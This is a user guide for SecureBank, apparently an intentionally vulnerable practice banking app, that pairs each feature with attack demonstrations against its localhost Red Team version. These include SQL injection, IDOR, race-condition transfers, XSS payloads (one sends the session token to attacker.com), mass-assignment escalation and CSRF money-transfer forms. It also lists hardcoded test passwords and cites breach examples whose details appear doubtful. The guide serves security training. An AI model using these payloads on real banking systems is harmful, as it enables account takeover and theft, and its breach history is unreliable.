# 🏦 SecureBank User Guide

**Complete Guide to Using SecureBank's Banking Features**

Part of the AegisForge Security Education Platform

---

## 📋 Table of Contents

1. [Introduction](#introduction)
2. [Getting Started](#getting-started)
3. [Login and Authentication](#login-and-authentication)
4. [Dashboard Overview](#dashboard-overview)
5. [Managing Accounts](#managing-accounts)
6. [Making Transfers](#making-transfers)
7. [Viewing Transactions](#viewing-transactions)
8. [Managing Profile](#managing-profile)
9. [Account Settings](#account-settings)
10. [Beneficiaries Management](#beneficiaries-management)
11. [Security Features](#security-features)
12. [Mobile Experience](#mobile-experience)
13. [Troubleshooting Common Issues](#troubleshooting-common-issues)
14. [Understanding the Differences: Red vs Blue](#understanding-the-differences-red-vs-blue)
15. [Best Practices](#best-practices)

---

## Introduction

Welcome to SecureBank! This guide teaches you how to use all features of our banking application. Whether you're using the Red Team (vulnerable) or Blue Team (secure) version, the user interface and features are identical.

### What is SecureBank?

SecureBank is a **realistic online banking application** that simulates what you'd find at a real bank:
- Check account balances
- Transfer money between accounts
- View transaction history
- Update personal information
- Manage beneficiaries
- Configure account settings

### Who Should Use This Guide?

- **Security students** learning web application vulnerabilities
- **Developers** understanding banking application features
- **Penetration testers** practicing on a safe, legal target
- **Anyone** interested in cybersecurity education

### Two Versions, Same Features

**Red Team (Vulnerable):**
- URL: http://127.0.0.1:8000
- API: http://127.0.0.1:5001
- Contains intentional security flaws
- For learning attack techniques

**Blue Team (Secure):**
- URL: http://127.0.0.1:8001
- API: http://127.0.0.1:5002
- Properly secured implementation
- For learning defense techniques

**The user experience is identical** - only the security implementations differ.

### Prerequisites

Before using this guide, make sure you've:
- ✅ Completed the Setup Guide (`01_SETUP_GUIDE.md`)
- ✅ Both APIs are running (ports 5001 and 5002)
- ✅ Frontend is accessible (ports 8000 and 8001)
- ✅ Database is initialized with test data

---

## Getting Started

### Accessing SecureBank

**Open your web browser** and navigate to:

**Red Team Version:**
```
http://127.0.0.1:8000/login.html
```

**Blue Team Version:**
```
http://127.0.0.1:8001/login.html
```

**Screenshot placeholder: [SecureBank login page with professional banking design]**

### First Time Setup

The first time you access SecureBank:

1. **No registration needed** - Use pre-configured test accounts
2. **Browser compatibility check** - Modern browsers (Chrome, Firefox, Edge, Safari)
3. **JavaScript must be enabled** - Required for interactive features
4. **Cookies/localStorage enabled** - Stores session information

### Test Account Credentials

The database comes with **5 pre-configured users**:

| Username | Password | Full Name | Accounts | Total Balance |
|----------|----------|-----------|----------|---------------|
| `john.doe` | `password123` | John Doe | Checking, Savings | $15,000 |
| `jane.smith` | `password123` | Jane Smith | Checking, Savings | $10,500 |
| `bob.wilson` | `password123` | Bob Wilson | Checking, Credit | $2,500 |
| `alice.brown` | `password123` | Alice Brown | Savings | $15,000 |
| `admin` | `admin123` | System Administrator | None | N/A |

**Recommendation:** Start with `john.doe` - this account has the most realistic data for testing.

### Understanding the Interface

SecureBank's interface follows modern banking design principles:

**Color Scheme:**
- **Blue (#2C5F8D)**: Primary brand color, trust and security
- **Green (#28A745)**: Positive actions, money incoming
- **Red (#DC3545)**: Alerts, money outgoing
- **Gray (#6C757D)**: Neutral information

**Layout:**
- **Top Navigation**: Logo, menu items, user profile
- **Sidebar** (logged in): Quick access to all features
- **Main Content**: Feature-specific content
- **Footer**: Links, copyright, version info

**Responsive Design:**
- Desktop: Full sidebar and navigation
- Tablet: Collapsible sidebar
- Mobile: Hamburger menu, stacked layout

---

## Login and Authentication

### The Login Process

The login page is your gateway to SecureBank. It authenticates your identity before granting access to your financial information.

**Screenshot placeholder: [Login form with username and password fields]**

### Logging In Step-by-Step

**Step 1: Enter Credentials**

1. Navigate to the login page
2. Enter your **username** (e.g., `john.doe`)
3. Enter your **password** (e.g., `password123`)
4. Click the **"Login"** button

**Step 2: Authentication Process**

Behind the scenes, SecureBank:
1. Sends credentials to the API (`POST /api/login`)
2. API validates username and password
3. If correct: Creates a session and returns a token
4. Frontend stores the token in localStorage
5. Redirects you to the dashboard

**Step 3: Successful Login**

You'll be redirected to: `dashboard.html`

### What Happens in Red Team vs Blue Team?

**Red Team (Vulnerable - SQL Injection):**
```javascript
// Vulnerable code - DO NOT USE IN REAL APPS
const query = `SELECT * FROM bank_users 
               WHERE username='${username}' 
               AND password='${password}'`;
```

**Why it's vulnerable:** User input is directly inserted into the SQL query. An attacker can manipulate the query logic.

**SQL Injection Example:**
- Username: `admin' OR '1'='1`
- Password: `anything`
- Result: Logs in as first user (usually admin) without knowing the password!

**Blue Team (Secure - Parameterized Query):**
```python
# Secure code with parameterized query
query = "SELECT * FROM bank_users WHERE username=? AND password=?"
cursor.execute(query, (username, hashed_password))
```

**Why it's secure:** User input is treated as data, not SQL code. The database engine prevents SQL injection.

### Understanding Sessions

**What is a session?** A session is how the application remembers you're logged in across different pages.

**How SecureBank manages sessions:**

1. **After login**: Server creates a unique session token
   ```json
   {
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "user_id": 1,
     "expires": "2024-01-15T12:00:00"
   }
   ```

2. **Token storage**: Frontend stores token in localStorage
   ```javascript
   localStorage.setItem('authToken', token);
   localStorage.setItem('userId', user_id);
   ```

3. **Subsequent requests**: Token included in all API calls
   ```javascript
   headers: {
     'Authorization': 'Bearer ' + token,
     'Content-Type': 'application/json'
   }
   ```

4. **Session expiration**: Token expires after 30 minutes of inactivity (configurable)

### Login Errors

**"Invalid credentials"**
- Username or password is incorrect
- Check spelling and capitalization
- Make sure Caps Lock is off

**"Account locked"**
- Too many failed login attempts (Blue Team only)
- Wait 15 minutes or contact administrator

**"Server error"**
- API is not running - check backend
- Database connection issue

**"Network error"**
- Frontend can't reach API
- Check if API is running on correct port
- Verify firewall settings

### Security Notes

**In Red Team (Educational):**
- Passwords stored in plain text (demonstrating bad practice)
- No rate limiting (allows brute force attacks)
- Vulnerable to SQL injection
- No multi-factor authentication

**In Blue Team (Secure):**
- Passwords hashed with bcrypt
- Rate limiting (5 failed attempts = 15 min lockout)
- Parameterized queries prevent SQL injection
- Session tokens with expiration
- HTTPS recommended (not included in local setup)

### Logging Out

**To logout:**
1. Click your name in the top-right corner
2. Select "Logout" from dropdown
3. Or click the "Logout" button in sidebar

**What happens:**
- Session token is deleted from localStorage
- You're redirected to login page
- API invalidates the session (Blue Team only)

---

## Dashboard Overview

The dashboard is your **home base** in SecureBank - it provides a quick overview of your financial status.

**Screenshot placeholder: [Dashboard showing accounts summary and recent transactions]**

### Dashboard Components

**1. Welcome Message**
```
Welcome back, John Doe!
Last login: January 15, 2024 at 09:30 AM
```

Shows personalized greeting and last login timestamp (security feature to detect unauthorized access).

**2. Account Summary Cards**

Each account displays:
- **Account Type** (Checking, Savings, Credit)
- **Account Number** (e.g., "CHK-1001")
- **Current Balance** (with currency symbol)
- **Status Indicator** (Active, Frozen, Closed)
- **Quick Actions** (View Details, Transfer)

**Example:**
```
┌─────────────────────────────────┐
│ 💰 Checking Account             │
│ Account: CHK-1001               │
│ Balance: $5,000.00              │
│ Status: ● Active                │
│ [View Details] [Transfer]       │
└─────────────────────────────────┘
```

**3. Total Balance**

Aggregates all account balances:
```
Total Balance Across All Accounts: $15,000.00
```

**Calculation:**
- Includes: Checking and Savings balances
- Excludes: Credit card debt (negative balance)
- Real-time: Updates when you make transfers

**4. Recent Transactions**

Shows last 5 transactions across all accounts:

| Date | Description | Amount | Account |
|------|-------------|--------|---------|
| Jan 15 | Salary Deposit | +$3,000.00 | Checking |
| Jan 14 | Grocery Store | -$87.45 | Checking |
| Jan 13 | Transfer to Savings | -$500.00 | Checking |
| Jan 13 | Transfer from Checking | +$500.00 | Savings |
| Jan 12 | ATM Withdrawal | -$100.00 | Checking |

**Color coding:**
- Green text/+ sign: Money incoming
- Red text/- sign: Money outgoing

**5. Quick Actions Panel**

Convenient shortcuts:
- 🔄 **Transfer Money** → Opens transfer page
- 📊 **View All Transactions** → Full transaction history
- 👤 **Update Profile** → Personal information
- ⚙️ **Settings** → Account preferences

### Understanding Account Types

**Checking Account:**
- **Purpose**: Daily transactions and bill payments
- **Typical balance**: $1,000 - $10,000
- **Features**: 
  - Unlimited transactions
  - Debit card access
  - Check writing
  - No minimum balance

**Savings Account:**
- **Purpose**: Long-term savings and emergency funds
- **Typical balance**: $5,000 - $50,000
- **Features**:
  - Interest earning (not simulated in SecureBank)
  - Limited withdrawals (6 per month in real banks)
  - Higher minimum balance requirements

**Credit Account:**
- **Purpose**: Credit card or line of credit
- **Balance**: Can be negative (debt owed)
- **Features**:
  - Credit limit
  - Interest charges (not simulated)
  - Rewards programs (not simulated)
  - Payment due dates

### Real-World Context

**Why dashboards matter in banking:**

1. **Quick Financial Health Check**: Users can see their overall financial status at a glance
2. **Fraud Detection**: Recent transactions help users spot unauthorized activity
3. **Financial Planning**: Total balance helps with budgeting decisions
4. **Convenience**: Quick actions reduce navigation time

**Security considerations:**
- Sensitive information is displayed - ensure privacy
- Session timeout prevents unauthorized access
- Activity logs track who accessed the dashboard when

---

## Managing Accounts

The Accounts page shows detailed information about each of your bank accounts.

**Screenshot placeholder: [Accounts page with multiple account cards]**

### Viewing Account Details

**Navigate to Accounts:**
1. Click "Accounts" in the sidebar
2. Or click "View Details" on any account card from dashboard

**What you'll see:**

**Account Card (Expanded View):**
```
┌──────────────────────────────────────────┐
│ 💰 CHECKING ACCOUNT                      │
├──────────────────────────────────────────┤
│ Account Number: CHK-1001                 │
│ Account Type: Checking                   │
│ Current Balance: $5,000.00               │
│ Available Balance: $5,000.00             │
│ Currency: USD                            │
│ Status: Active                           │
│ Opened: January 1, 2023                  │
├──────────────────────────────────────────┤
│ [Transfer Money] [View Transactions]     │
│ [Download Statement] [Close Account]     │
└──────────────────────────────────────────┘
```

### Understanding Account Fields

**Account Number:**
- Format: `TYPE-XXXX` (e.g., CHK-1001, SAV-1002)
- Unique identifier for each account
- Used when making transfers
- Never share with untrusted parties

**Current Balance vs Available Balance:**
- **Current Balance**: Actual money in account right now
- **Available Balance**: Money you can spend (current balance minus pending transactions)
- In SecureBank, these are usually the same (no pending transactions simulated)

**Account Status:**
- **Active**: Normal operation, can transact
- **Frozen**: Viewing only, no transactions (simulates fraud hold)
- **Closed**: No longer in use, zero balance

**Opened Date:**
- When the account was created
- Used for account age verification
- Helpful for tracking financial history

### Account Actions

**1. Transfer Money**
- Redirects to Transfer page
- Pre-selects this account as "From" account
- Quick way to move money

**2. View Transactions**
- Shows all transactions for this specific account
- Filtered transaction history
- Can download as CSV

**3. Download Statement**
- Generates PDF statement (Blue Team only)
- Includes all transactions for selected period
- Useful for tax purposes or record keeping

**4. Close Account**
- Marks account as closed (Blue Team only)
- Requires zero balance
- Requires administrator approval (simulated)
- Irreversible action

### The IDOR Vulnerability (Red Team)

**What is IDOR?** Insecure Direct Object Reference - accessing other users' data by manipulating IDs.

**How it works in Red Team:**

The URL structure exposes account IDs:
```
http://127.0.0.1:8000/accounts.html?id=1
```

**Vulnerability:** Change `id=1` to `id=2` and you can see another user's account!

**Red Team API (Vulnerable):**
```python
@app.route('/api/accounts/<int:account_id>')
def get_account(account_id):
    # NO AUTHORIZATION CHECK!
    account = Account.query.get(account_id)
    return jsonify(account.to_dict())
```

**Why it's vulnerable:**
- No check if the logged-in user owns this account
- Anyone can access any account by guessing IDs
- Real banks lost millions due to IDOR vulnerabilities

**Blue Team API (Secure):**
```python
@app.route('/api/accounts/<int:account_id>')
@login_required
def get_account(account_id):
    # AUTHORIZATION CHECK
    account = Account.query.get(account_id)
    if account.user_id != current_user.id:
        return jsonify({'error': 'Unauthorized'}), 403
    return jsonify(account.to_dict())
```

**Why it's secure:**
- Verifies the account belongs to the logged-in user
- Returns 403 Forbidden if unauthorized
- Proper access control

**Testing the vulnerability:**
1. Login as `john.doe` (user_id = 1)
2. Note your account IDs (e.g., accounts 1 and 2)
3. Try accessing: `http://127.0.0.1:5001/api/accounts/3`
4. In Red Team: You'll see Alice's account!
5. In Blue Team: You'll get an authorization error

### Real-World Impact

**Famous IDOR Breaches:**
- **2019**: Optus (telecom) exposed 100k+ customer records
- **2020**: Banking app allowed access to any transaction by ID manipulation
- **2021**: Healthcare app leaked patient records via IDOR

**Lesson:** Always validate that the user has permission to access the requested resource!

---

## Making Transfers

The Transfer page allows you to move money between accounts - yours or to beneficiaries.

**Screenshot placeholder: [Transfer form with from/to accounts and amount]**

### Transfer Types

**1. Internal Transfer (Between Your Accounts)**
- From your Checking to your Savings
- Instant, no fees
- Common use: Saving a portion of paycheck

**2. External Transfer (To Beneficiary)**
- From your account to saved beneficiary
- May have fees in real banks (not simulated)
- Requires beneficiary setup

### Making a Transfer Step-by-Step

**Step 1: Navigate to Transfer Page**
- Click "Transfer" in sidebar
- Or "Transfer Money" from any account card

**Step 2: Fill in Transfer Form**

**From Account:**
```
Select account: [Checking - CHK-1001 ($5,000.00)] ▼
```
- Dropdown shows all your active accounts
- Current balance displayed for reference
- Can't select accounts with zero balance

**To Account:**
```
Select recipient: [My Savings - SAV-1002] ▼
               OR [Jane Smith - SAV-2001] ▼ (if saved as beneficiary)
```
- Your other accounts listed first
- Beneficiaries listed below (if any)
- Can't transfer to the same account

**Amount:**
```
Enter amount: $[___________]
```
- Must be greater than $0
- Must not exceed available balance
- Supports decimal places (e.g., $100.50)

**Note (Optional):**
```
Transfer reason: [________________________________]
```
- Helps you remember why you made this transfer
- Appears in transaction history
- Examples: "Rent payment", "Savings goal", "Birthday gift"

**Screenshot placeholder: [Filled transfer form ready to submit]**

**Step 3: Review and Confirm**

```
┌─────────────────────────────────┐
│ Transfer Summary                │
├─────────────────────────────────┤
│ From: Checking (CHK-1001)       │
│ To: Savings (SAV-1002)          │
│ Amount: $500.00                 │
│ Note: Monthly savings           │
│ Fee: $0.00                      │
│ Total Deduction: $500.00        │
├─────────────────────────────────┤
│ [Cancel] [Confirm Transfer]     │
└─────────────────────────────────┘
```

**Step 4: Submit Transfer**
- Click "Confirm Transfer"
- API processes the transaction
- Balances update in real-time
- Confirmation message appears

**Success Message:**
```
✓ Transfer successful!
$500.00 transferred from Checking to Savings
Transaction ID: TXN-1234567
```

### The Race Condition Vulnerability (Red Team)

**What is a race condition?** When two operations execute simultaneously, causing unexpected behavior.

**The Unlimited Money Exploit:**

**Red Team API (Vulnerable):**
```python
@app.route('/api/transfer', methods=['POST'])
def transfer():
    from_account = Account.query.get(from_id)
    to_account = Account.query.get(to_id)
    
    # NO LOCKING! Race condition possible
    if from_account.balance >= amount:
        from_account.balance -= amount  # Step 1
        to_account.balance += amount    # Step 2
        db.session.commit()             # Step 3
        return jsonify({'success': True})
    return jsonify({'error': 'Insufficient funds'})
```

**How to exploit:**
1. Open transfer page in TWO browser tabs
2. Set up identical transfers (e.g., $500 from Checking)
3. Click "Confirm" in BOTH tabs at the exact same time
4. Result: Money is transferred twice, but only deducted once!

**Why it happens:**
```
Tab 1: Check balance ($1000) ✓ → Deduct $500 → Balance = $500
Tab 2: Check balance ($1000) ✓ → Deduct $500 → Balance = $500
       (Tab 2 checked before Tab 1 committed!)
```

**Blue Team API (Secure):**
```python
@app.route('/api/transfer', methods=['POST'])
@transaction_lock
def transfer():
    # WITH LOCKING - Prevents race conditions
    with db.session.begin_nested():
        from_account = Account.query.with_for_update().get(from_id)
        
        if from_account.balance >= amount:
            from_account.balance -= amount
            to_account.balance += amount
            db.session.commit()
            return jsonify({'success': True})
        return jsonify({'error': 'Insufficient funds'})
```

**Why it's secure:**
- `with_for_update()`: Locks the row during the transaction
- Other requests must wait until lock is released
- Prevents simultaneous modifications

### Real-World Impact

**Race Condition Exploits:**
- **2016**: Banking API allowed users to withdraw same money multiple times
- **2018**: Cryptocurrency exchange lost $40M due to race condition
- **2020**: E-commerce site allowed negative balance purchases

**Lesson:** Always use database transactions and locks for financial operations!

### Transfer Limits and Validation

**Amount Validation:**
- Minimum: $0.01
- Maximum: Account balance (can't overdraw)
- Format: Up to 2 decimal places

**Daily Limits (Blue Team only):**
- $10,000 per day to external accounts
- Unlimited between your own accounts
- Resets at midnight UTC

**Error Messages:**
- "Insufficient funds": Amount > balance
- "Daily limit exceeded": Over $10,000 (Blue Team)
- "Invalid amount": Negative or zero
- "Same account": Can't transfer to self

---

## Viewing Transactions

The Transactions page shows your complete financial history.

**Screenshot placeholder: [Transaction history table with filters]**

### Transaction List

**Default view** shows all transactions, newest first:

| Date & Time | Type | Description | Account | Amount | Balance After |
|-------------|------|-------------|---------|--------|---------------|
| Jan 15, 10:30 AM | Transfer Out | To Savings | CHK-1001 | -$500.00 | $4,500.00 |
| Jan 15, 10:30 AM | Transfer In | From Checking | SAV-1002 | +$500.00 | $10,500.00 |
| Jan 14, 3:45 PM | Debit | Grocery Store | CHK-1001 | -$87.45 | $5,000.00 |
| Jan 13, 9:00 AM | Deposit | Salary | CHK-1001 | +$3,000.00 | $5,087.45 |
| Jan 12, 6:30 PM | ATM | Cash Withdrawal | CHK-1001 | -$100.00 | $2,087.45 |

### Understanding Transaction Fields

**Date & Time:**
- When the transaction occurred
- Timezone: Server time (UTC or local)
- Format: MMM DD, HH:MM AM/PM

**Type:**
- **Transfer In/Out**: Money moved between accounts
- **Deposit**: Money added (salary, check deposit)
- **Withdrawal**: Money removed (ATM, debit card)
- **Fee**: Bank charges
- **Refund**: Returned payment

**Description:**
- Human-readable explanation
- Can include merchant name
- Custom notes from transfers

**Account:**
- Which account was affected
- Shown as account number (e.g., CHK-1001)
- Clicking opens account details

**Amount:**
- Transaction value
- Green (+) = money in
- Red (-) = money out
- Currency symbol included

**Balance After:**
- Account balance immediately after this transaction
- Helps verify account history
- Useful for reconciliation

### Filtering Transactions

**By Account:**
```
Filter by account: [All Accounts ▼]
                   [Checking - CHK-1001]
                   [Savings - SAV-1002]
```

**By Date Range:**
```
From: [01/01/2024] To: [01/15/2024]
```

**By Type:**
```
Transaction type: [All Types ▼]
                  [Transfers]
                  [Deposits]
                  [Withdrawals]
```

**By Amount:**
```
Min amount: $[_____] Max amount: $[_____]
```

**Search:**
```
Search descriptions: [________________]🔍
```
- Searches transaction descriptions and notes
- Not case-sensitive
- Partial matches work

### The XSS Vulnerability (Red Team)

**What is XSS?** Cross-Site Scripting - injecting malicious JavaScript into web pages.

**Where it exists:** In transaction notes/descriptions.

**How to exploit:**

**Step 1: Make a transfer with malicious note**
```
Transfer note: <script>alert('XSS!')</script>
```

**Step 2: View transactions page**

**Red Team (Vulnerable):**
```javascript
// Displays user input without sanitization
document.getElementById('note').innerHTML = transaction.note;
```

Result: JavaScript executes! Alert box pops up.

**More dangerous payloads:**
```javascript
// Steal session token
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('authToken'));
</script>

// Redirect to phishing site
<script>
  window.location = 'https://fake-securebank.com/login';
</script>

// Modify page content
<script>
  document.body.innerHTML = '<h1>Your account has been hacked!</h1>';
</script>
```

**Blue Team (Secure):**
```javascript
// Properly encodes HTML special characters
document.getElementById('note').textContent = transaction.note;
// Or uses sanitization library
document.getElementById('note').innerHTML = DOMPurify.sanitize(transaction.note);
```

**Why it's secure:**
- `textContent` treats everything as text, not HTML
- DOMPurify removes dangerous tags and attributes
- CSP (Content Security Policy) headers block inline scripts

**Testing XSS:**
1. Login and go to Transfer page
2. Enter XSS payload in note field
3. Submit transfer
4. Go to Transactions page
5. Red Team: Script executes
6. Blue Team: Script displays as harmless text

### Real-World Impact

**Famous XSS Attacks:**
- **2005**: MySpace Samy worm infected 1M+ profiles in 24 hours
- **2018**: British Airways breach via XSS led to $230M fine
- **2020**: PayPal XSS allowed session hijacking

**Types of XSS:**
- **Stored XSS** (what SecureBank demonstrates): Stored in database
- **Reflected XSS**: Reflected from URL parameters
- **DOM-based XSS**: Exploits client-side JavaScript

**Lesson:** NEVER trust user input. Always sanitize before displaying!

### Exporting Transactions

**Download as CSV:**
```
[Download CSV] button
```

**Generated file:** `transactions_2024-01-15.csv`

**Contents:**
```csv
Date,Time,Type,Description,Account,Amount,Balance
2024-01-15,10:30:00,Transfer Out,To Savings,CHK-1001,-500.00,4500.00
2024-01-15,10:30:00,Transfer In,From Checking,SAV-1002,+500.00,10500.00
```

**Uses:**
- Tax preparation
- Budget tracking
- Spreadsheet analysis
- Financial planning software import

**Download as PDF Statement (Blue Team only):**
- Professional bank statement format
- Includes header with account details
- Footer with bank information
- Pagination for long histories

---

## Managing Profile

The Profile page lets you view and update your personal information.

**Screenshot placeholder: [Profile form with personal details]**

### Profile Information

**Personal Details:**
- **Full Name**: Your legal name
- **Username**: Login identifier (cannot change)
- **Email Address**: Contact email
- **Phone Number**: Contact phone
- **Address**: Mailing address

**Account Information:**
- **Account ID**: Unique user identifier
- **Role**: user or admin
- **Member Since**: Account creation date
- **Last Login**: Most recent login timestamp

### Updating Your Profile

**Step 1: Navigate to Profile**
- Click "Profile" in sidebar
- Or click your name → "Profile" in top menu

**Step 2: Edit Information**

**Form fields:**
```
Full Name:    [John Doe                    ]
Email:        [john.doe@email.com          ]
Phone:        [(555) 123-4567              ]
Address:      [123 Main Street             ]
              [Anytown, ST 12345           ]
```

**Step 3: Save Changes**
- Click "Update Profile" button
- API validates and saves changes
- Success message appears

**Success:**
```
✓ Profile updated successfully!
```

### The Mass Assignment Vulnerability (Red Team)

**What is mass assignment?** Allowing users to modify fields they shouldn't have access to.

**Red Team API (Vulnerable):**
```python
@app.route('/api/profile', methods=['PUT'])
def update_profile():
    data = request.get_json()
    user = User.query.get(current_user_id)
    
    # DANGEROUS: Updates ALL fields from request
    for key, value in data.items():
        setattr(user, key, value)
    
    db.session.commit()
    return jsonify({'success': True})
```

**How to exploit:**

**Normal request:**
```json
{
  "full_name": "John Doe",
  "email": "john@email.com",
  "phone": "555-1234"
}
```

**Malicious request (using Postman or curl):**
```json
{
  "full_name": "John Doe",
  "email": "john@email.com",
  "phone": "555-1234",
  "role": "admin",        ← Added!
  "balance": 1000000      ← Added!
}
```

**Result:** You just made yourself an admin with $1M!

**Why it works:**
- API blindly accepts all fields from the request
- No whitelist of allowed fields
- `role` field gets updated to 'admin'
- You've escalated your privileges!

**Blue Team API (Secure):**
```python
@app.route('/api/profile', methods=['PUT'])
def update_profile():
    data = request.get_json()
    user = User.query.get(current_user_id)
    
    # SECURE: Only update whitelisted fields
    allowed_fields = ['full_name', 'email', 'phone', 'address']
    
    for field in allowed_fields:
        if field in data:
            setattr(user, field, data[field])
    
    db.session.commit()
    return jsonify({'success': True})
```

**Why it's secure:**
- Only whitelisted fields can be updated
- Sensitive fields like `role` are protected
- Explicit is better than implicit

**Testing mass assignment:**
1. Open browser Developer Tools (F12)
2. Go to Profile page
3. Open Console tab
4. Execute:
```javascript
fetch('http://127.0.0.1:5001/api/profile', {
  method: 'PUT',
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('authToken'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    full_name: 'John Doe',
    role: 'admin'  // Trying to escalate
  })
}).then(r => r.json()).then(console.log);
```

5. Check your profile - in Red Team, role changed to admin!
6. In Blue Team, role remains 'user'

### Real-World Impact

**Mass Assignment Exploits:**
- **2012**: GitHub - Users could add themselves to any repository
- **2013**: Ruby on Rails apps - Widespread mass assignment issues
- **2019**: API allowed users to modify admin-only fields

**Lesson:** Always use explicit whitelists for user-modifiable fields!

### Profile Validation

**Email format:**
- Must contain @
- Valid domain
- Example: `user@example.com`

**Phone format:**
- Flexible: `555-1234`, `(555) 123-4567`, `+1-555-123-4567`
- Stored normalized in database

**Name requirements:**
- 2-100 characters
- Letters, spaces, hyphens allowed
- No numbers or special characters

---

## Account Settings

The Settings page lets you configure account preferences and security options.

**Screenshot placeholder: [Settings page with various configuration options]**

### Available Settings

**Notification Preferences:**
- ✓ Email notifications for large transactions
- ✓ SMS alerts for logins from new devices
- ✓ Monthly statement emails
- ✓ Marketing communications

**Security Settings:**
- Change password
- Two-factor authentication (Blue Team only)
- Trusted devices management
- Session timeout preferences

**Display Preferences:**
- Language selection
- Timezone
- Currency display format
- Date format (MM/DD/YYYY vs DD/MM/YYYY)

**Privacy Settings:**
- Hide account numbers in public displays
- Limit transaction history sharing
- Opt out of data analytics

### Changing Settings

**Step 1: Navigate to Settings**
- Click "Settings" in sidebar

**Step 2: Modify Preferences**

**Example - Email Notifications:**
```
Email Notifications
☑ Transaction alerts over $500
☐ Weekly account summary
☑ Security alerts
☐ Promotional offers
```

**Step 3: Save Changes**
- Click "Save Settings"
- May require password confirmation (Blue Team)

### The CSRF Vulnerability (Red Team)

**What is CSRF?** Cross-Site Request Forgery - tricking users into performing unwanted actions.

**How it works:**

**Red Team (Vulnerable):**
- No CSRF token validation
- Any website can submit forms to SecureBank

**Attack scenario:**

**Attacker creates malicious website:**
```html
<!-- evil-site.com/pwned.html -->
<html>
<body>
<h1>You've won a prize!</h1>
<img src="http://127.0.0.1:5001/api/settings?email_alerts=false&notifications=false">
</body>
</html>
```

**What happens:**
1. Victim is logged into SecureBank
2. Victim visits evil-site.com
3. Browser automatically sends SecureBank cookies
4. Settings are changed without victim's knowledge!

**More dangerous CSRF:**
```html
<!-- Silently transfers money -->
<form id="hack" action="http://127.0.0.1:5001/api/transfer" method="POST">
  <input name="from_account" value="CHK-1001">
  <input name="to_account" value="ATTACKER-ACCOUNT">
  <input name="amount" value="1000">
</form>
<script>document.getElementById('hack').submit();</script>
```

**Blue Team (Secure):**
```python
@app.route('/api/settings', methods=['POST'])
@csrf_protected
def update_settings():
    # Validates CSRF token
    token = request.headers.get('X-CSRF-Token')
    if not validate_csrf_token(token, session['csrf_secret']):
        return jsonify({'error': 'Invalid CSRF token'}), 403
    
    # Process settings update...
```

**CSRF Protection Mechanisms:**

1. **CSRF Tokens:**
```javascript
// Frontend includes token in requests
headers: {
  'X-CSRF-Token': getCsrfToken()
}
```

2. **SameSite Cookies:**
```python
# Prevents cookies from being sent cross-site
response.set_cookie('session', value, samesite='Strict')
```

3. **Origin Validation:**
```python
# Check request origin matches expected domain
if request.headers.get('Origin') != 'http://127.0.0.1:8001':
    return 403
```

**Testing CSRF:**
1. Create simple HTML file:
```html
<form action="http://127.0.0.1:5001/api/settings" method="POST">
  <input name="email_alerts" value="false">
  <input type="submit" value="Click me!">
</form>
```
2. Open while logged into SecureBank (Red Team)
3. Submit form
4. Settings change without CSRF protection!
5. Same test on Blue Team: Fails with CSRF error

### Real-World Impact

**Famous CSRF Attacks:**
- **2008**: Gmail filter CSRF allowed email theft
- **2020**: TikTok CSRF allowed unauthorized account modifications
- **Netflix, YouTube, Facebook** have all had CSRF vulnerabilities

**Lesson:** Always validate request authenticity, not just authentication!

---

## Beneficiaries Management

Beneficiaries are saved recipients for faster transfers.

**Screenshot placeholder: [Beneficiaries list with add/edit options]**

### What Are Beneficiaries?

**In banking:** Beneficiaries (or payees) are people or accounts you frequently send money to.

**Benefits:**
- Faster transfers (no need to enter details each time)
- Reduced errors (details saved correctly)
- Transaction history by beneficiary
- Nickname support (e.g., "Mom" instead of account number)

### Adding a Beneficiary

**Step 1: Navigate to Beneficiaries**
- Click "Beneficiaries" in sidebar

**Step 2: Click "Add Beneficiary"**

**Step 3: Fill in Details**
```
Beneficiary Name:   [Jane Smith          ]
Account Number:     [SAV-2001            ]
Bank Name:          [SecureBank          ]
Nickname:           [Sister              ]
```

**Step 4: Save**
- Click "Add Beneficiary"
- Beneficiary appears in transfer dropdown

### Managing Beneficiaries

**View all beneficiaries:**
```
┌────────────────────────────────────────┐
│ Jane Smith (Sister)                    │
│ Account: SAV-2001                      │
│ Bank: SecureBank                       │
│ [Transfer] [Edit] [Delete]             │
├────────────────────────────────────────┤
│ Bob's Coffee Shop                      │
│ Account: BUS-5001                      │
│ Bank: SecureBank                       │
│ [Transfer] [Edit] [Delete]             │
└────────────────────────────────────────┘
```

**Actions:**
- **Transfer**: Quick transfer to this beneficiary
- **Edit**: Update details or nickname
- **Delete**: Remove beneficiary (doesn't affect past transactions)

---

## Security Features

### Password Requirements

**Strong password criteria (Blue Team):**
- Minimum 12 characters
- At least one uppercase letter
- At least one lowercase letter
- At least one number
- At least one special character (!@#$%^&*)
- Not in common password lists

**Example strong password:**
```
MyS3cur3B@nk!2024
```

### Two-Factor Authentication (Blue Team Only)

**What is 2FA?** Second verification step after password.

**Setup process:**
1. Settings → Security → Enable 2FA
2. Scan QR code with authenticator app (Google Authenticator, Authy)
3. Enter 6-digit code to verify
4. Save backup codes

**Login with 2FA:**
1. Enter username and password
2. Prompted for 6-digit code
3. Enter code from authenticator app
4. Granted access

**Why 2FA matters:** Even if password is stolen, attacker can't login without your phone.

### Session Management

**Session timeout:**
- Red Team: Never expires (insecure)
- Blue Team: 30 minutes of inactivity

**Multiple sessions:**
- Blue Team allows viewing active sessions
- Can remotely logout from other devices

### Activity Logs

**Blue Team tracks:**
- All logins (success and failed)
- IP addresses
- Transaction history
- Settings changes
- Failed authorization attempts

**Use cases:**
- Detect unauthorized access
- Audit trail for compliance
- Troubleshooting account issues

---

## Mobile Experience

SecureBank is **fully responsive** - works on phones and tablets.

### Mobile Layout Differences

**Navigation:**
- Desktop: Always-visible sidebar
- Mobile: Hamburger menu (☰)

**Account Cards:**
- Desktop: 3-column grid
- Tablet: 2-column grid
- Mobile: Single column, stacked

**Forms:**
- Desktop: Multi-column layouts
- Mobile: Single column, larger touch targets

**Tables:**
- Desktop: Full table view
- Mobile: Card-based view (easier scrolling)

### Mobile Best Practices

**Using on mobile:**
1. Portrait mode recommended for forms
2. Landscape for viewing transaction tables
3. Use biometric login if browser supports it
4. Enable mobile notifications (Blue Team)

---

## Troubleshooting Common Issues

### Can't Login

**Check:**
- Username and password are correct
- Caps Lock is off
- API is running (http://127.0.0.1:5001/api/health)
- Browser console for JavaScript errors (F12)

### Balance Not Updating

**Solutions:**
- Refresh page (F5)
